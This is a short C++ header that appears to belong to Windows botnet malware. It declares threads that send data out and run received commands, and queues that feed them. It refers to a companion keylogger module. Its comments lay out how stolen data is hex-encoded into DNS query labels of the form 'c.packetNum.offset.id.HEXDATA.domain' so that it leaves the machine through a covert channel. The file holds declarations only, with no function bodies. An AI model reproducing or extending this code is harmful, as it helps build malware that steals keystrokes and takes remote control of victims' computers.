#pragma once
#include <string>
#include <windows.h>
#include <queue>
#include <mutex>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")

DWORD WINAPI senderBotnetThread(LPVOID lpParam);
DWORD handle_botnet(LPVOID lpParam);
void EnqueueSend(const std::string& s);
void EnqueueExecute(const std::string& s);

// Use packetNumber from KeyLogger.h for consistency
inline std::queue<std::string> send_queue;
inline std::mutex queue_mutex;
inline std::queue<std::string> execute_queue;
inline std::mutex execute_mutex;
inline bool should_stop_sender = false;
// Reduce max_len to avoid DNS query length limit
// DNS label max = 63, total max = 253
// Format: c.packetNum.offset.id.HEXDATA.domain
// Reserve ~20 for prefix, ~15 for domain = ~38 chars for hex
// 38 hex chars = 19 bytes original data
constexpr int max_len = 30; // Reduced from 60 to avoid DNS length limit
